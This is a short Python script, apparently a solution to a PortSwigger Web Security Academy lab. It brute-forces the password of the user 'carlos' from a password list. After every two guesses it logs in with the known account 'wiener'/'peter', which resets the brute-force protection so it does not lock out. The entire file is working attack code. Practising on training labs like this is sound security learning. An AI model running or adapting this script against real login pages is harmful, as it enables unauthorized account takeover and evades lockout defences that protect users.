import requests
import re

passwords = open("passwords.txt", "r")

data = {"username": "wiener", "password": "peter"}
respuesta1 = requests.post("https://0ad300780387f6368075fd5700ba00ca.web-security-academy.net/login", data=data)
t= 2

for i in passwords:
    data1 = {"username": "carlos", "password": i.strip()}
    respuesta2 = requests.post("https://0ad300780387f6368075fd5700ba00ca.web-security-academy.net/login", data=data1)
    coincidencia = re.findall("Incorrect password", respuesta2.text)
    t = t - 1
    if t == 0:
        data2 = {"username": "wiener", "password": "peter"}
        respuesta3 = requests.post("https://0ad300780387f6368075fd5700ba00ca.web-security-academy.net/login", data=data2)
        t = 2
    if coincidencia == []:
        print("Password de Carlos: " + i.strip())
        quit()
